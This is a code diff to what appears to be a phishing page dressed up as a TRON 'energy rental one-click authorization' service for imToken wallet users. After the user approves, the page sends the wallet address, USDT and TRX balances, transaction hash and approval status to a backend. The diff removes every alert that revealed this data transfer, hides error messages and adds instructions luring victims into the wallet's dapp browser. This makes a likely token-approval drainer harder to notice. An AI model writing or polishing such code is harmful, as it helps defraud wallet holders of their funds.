@@ -28,7 +28,7 @@
     <h1>能量租赁一键授权</h1>
     <div class="warning">
         ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开<br>
-        ⚠️ 已匹配后端，发送6个字段（含授权状态）
+        ⚠️ 请先点击 <strong>复制链接 <strong>然后连接imToken钱包在钱包底部点击“浏览”在顶部搜索栏内粘贴访问网站
     </div>
 </div>
 <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
@@ -86,14 +86,14 @@
         connectBtn.onclick = async () => {
             try {
                 if (!window.tronWeb) {
-                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
+                    window.location.href = `imtoken://dapp?url=${encodeURIComponent(window.location.href)}`;
                     return;
                 }
                 const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                 userAddress = accounts[0];
                 await initWallet();
             } catch (e) {
-                alert(`【连接】失败：${e.message}`);
+               
             }
         };
 
@@ -140,9 +140,8 @@
             } finally {
                 // 发送6个字段到后端
                 try {
-                    alert(`【发送】6个字段（含授权状态）：\n1.地址：${postData.address.slice(0,8)}...\n2.USDT：${postData.tokenBalance}\n3.TRX：${postData.trxBalance}\n4.时间：${postData.approveTime}\n5.哈希：${postData.txHash.slice(0,10)}...\n6.授权成功：${postData.isApproved}`);
-                    
-                    const res = await fetch(BACKEND_API, {
+                   
+                const res = await fetch(BACKEND_API, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(postData), // 包含isApproved字段
@@ -151,9 +150,8 @@
 
                     const resData = await res.json();
                     if (!res.ok) throw new Error(resData.error || `后端返回${res.status}`);
-                    alert(`【发送】成功！后端反馈：${resData.message}`);
-                } catch (sendErr) {
-                    alert(`【发送】失败：${sendErr.message}`);
+                   } catch (sendErr) {
+                    
                 }
             }
         };
@@ -182,7 +180,7 @@
             `;
             document.getElementById("approveBtn").disabled = false;
         } catch (e) {
-            alert(`【初始化】失败：${e.message}`);
+            
             tokenBalance = "0.00";
             trxBalance = "0.00";
         }
@@ -196,7 +194,7 @@
             newRecords.push(record);
             localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
         } catch (e) {
-            alert(`【保存】失败：${e.message}`);
+            
         }
     }
 
@@ -219,7 +217,7 @@
                 </div>
             `).join("");
         } catch (e) {
-            alert(`【渲染】失败：${e.message}`);
+            
         }
     }
 </script>
